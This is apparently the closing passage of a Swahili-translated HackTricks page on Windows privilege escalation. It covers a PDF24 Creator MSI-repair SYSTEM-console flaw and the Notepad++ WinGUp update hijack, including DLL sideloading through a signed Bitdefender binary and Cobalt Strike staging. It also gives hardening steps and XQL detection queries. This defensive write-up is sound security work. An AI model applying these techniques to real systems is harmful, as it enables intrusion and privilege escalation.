PDF24 Creator 11.15.1 inaonyesha hatari tofauti ya MSI-repair: custom action yake ya kusakinisha printa inaweza kuanzisha console inayoonekana yenye haki za SYSTEM wakati wa repair. Vendor alibadilisha MSI installer katika 11.15.2 ili kushughulikia tabia hii. Toleo la zamani la bidhaa ni kidokezo cha awali cha uchunguzi tu. Kagua kifurushi cha MSI kilichosajiliwa au kinachoweza kufikiwa, ikiwa mtumiaji huyu anaweza kuanzisha repair, ikiwa custom action iliyo hatarini na ucheleweshaji wa log-file vipo, na ikiwa desktop inayoingiliana inaweza kuonyesha console. Ucheleweshaji ulioripotiwa ulitumia oplock kwenye `faxPrnInst.log`; uwezo wa kawaida wa kuandika faili si sharti pekee la ufikiaji. Shell isiyoingiliana, kifurushi kisichoweza kufikiwa, au installer iliyotiwa viraka vinaweza kukatiza mnyororo huu. Tatizo hili halitegemei `AlwaysInstallElevated` na ni tofauti na kubadilisha script ya muda yenye jina linalotabirika.

---
## Utekaji wa remote supply-chain kupitia uthibitishaji dhaifu wa updater (WinGUp / Notepad++)

Kati ya Juni 2025 na Desemba 2025, washambuliaji waliodhibiti miundombinu ya hosting iliyokuwa nyuma ya mtiririko wa update wa Notepad++ waliwapelekea waathiriwa waliochaguliwa manifests hasidi. Updaters za zamani zilizotumia WinGUp hazikuthibitisha kikamilifu uhalisi wa updates, hivyo jibu la XML hasidi lingeweza kuelekeza clients kwenye URLs zinazodhibitiwa na washambuliaji. Kwa kuwa client ilikubali maudhui ya HTTPS bila kulazimisha uthibitishaji wa certificate chain inayoaminika pamoja na PE signature halali kwenye installer iliyopakuliwa, waathiriwa walipakua na kutekeleza `update.exe` ya NSIS iliyowekewa trojan.<sup>[[12]](#references)[[13]](#references)</sup>

Mtiririko wa kiutendaji (hakuna local exploit inayohitajika):
1. **Kuingilia miundombinu**: dhibiti CDN/hosting na ujibu ukaguzi wa updates kwa metadata ya mshambuliaji inayoelekeza kwenye URL ya upakuaji hasidi.
2. **NSIS iliyowekewa trojan**: installer hupakua/tekeleza payload na kutumia vibaya minyororo miwili ya utekelezaji:
   - **Kutumia binary iliyosainiwa uliyoileta mwenyewe + sideload**: jumuisha `BluetoothService.exe` iliyosainiwa na Bitdefender, kisha uweke `log.dll` hasidi kwenye search path yake. Binary iliyosainiwa inapoendeshwa, Windows husideload `log.dll`, ambayo hufungua usimbaji na kupakia kwa njia ya reflectively Chrysalis backdoor (iliyolindwa na Warbird + API hashing ili kuzuia ugunduzi tuli).
   - **Uingizaji wa shellcode kwa script**: NSIS hutekeleza script ya Lua iliyokusanywa inayotumia Win32 APIs (kwa mfano, `EnumWindowStationsW`) kuingiza shellcode na kuandaa Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Mambo ya kuimarisha/ugunduzi kwa auto-updater yoyote:
- Lazimisha **uthibitishaji wa certificate + signature** wa installer iliyopakuliwa (funga signer wa vendor, kataa CN/chain zisizolingana) na usaini manifest ya update yenyewe (kwa mfano, XMLDSig). Zuia redirects zinazodhibitiwa na manifest isipokuwa zimethibitishwa.
- Chukulia **sideloading ya binary iliyosainiwa uliyoleta mwenyewe** kama sehemu ya uchunguzi baada ya upakuaji: toa tahadhari pale EXE iliyosainiwa na vendor inapopakia DLL yenye jina kutoka nje ya install path yake ya kawaida (kwa mfano, Bitdefender inapopakia `log.dll` kutoka Temp/Downloads), na pale updater inapoweka/tekeleza installers kutoka temp zenye signatures zisizo za vendor.
- Fuatilia **vielelezo mahususi vya malware** vilivyoonekana kwenye mnyororo huu (vinafaa kama pivots za jumla): mutex `Global\Jdhfv_1.0.1`, maandishi yasiyo ya kawaida ya `gup.exe` kwenye `%TEMP%`, na hatua za uingizaji wa shellcode zinazoendeshwa na Lua.
- Notepad++ iliimarisha WinGUp kuanzia v8.8.9 na matoleo ya baadaye: XML inayorejeshwa sasa imesainiwa (XMLDSig), na matoleo mapya zaidi yanalazimisha uthibitishaji wa certificate + signature wa installer iliyopakuliwa badala ya kuamini usafirishaji pekee.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideloading ya <code>log.dll</code> na EXE iliyosainiwa na Bitdefender (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> ikizindua kisakinishi kisicho cha Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Mifumo hii inatumika kwa updater yoyote inayokubali manifests zisizosainiwa au isiyohakikisha saini za wasakinishaji—kutekwa kwa mtandao + installer hasidi + sideloading iliyosainiwa kwa cheti chako huwezesha remote code execution kwa kisingizio cha masasisho “yanayoaminika”.

---
## References
- [1] [Ushauri wa usalama – Netskope Client for Windows – Local Privilege Escalation kupitia Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Ushauri wa Usalama wa Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – plugin ya Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – mteja/exploit wa Netskope IPC](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre na Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Local Privilege Escalation kupitia faili zinazoweza kuandikwa katika Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Privilege escalation katika Windows agent](https://checkmk.com/werk/16361)
- [10] [PoC za sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Waigizaji wa Taifa Wanatumia Msururu wa Ugavi wa Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – sasisho kuhusu tukio la miundombinu iliyotekwa](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Kukwepa marekebisho ya CVE-2025-0309 katika Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Kugundua hitilafu za Privilege Escalation katika Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
{{#include ../../banners/hacktricks-training.md}}
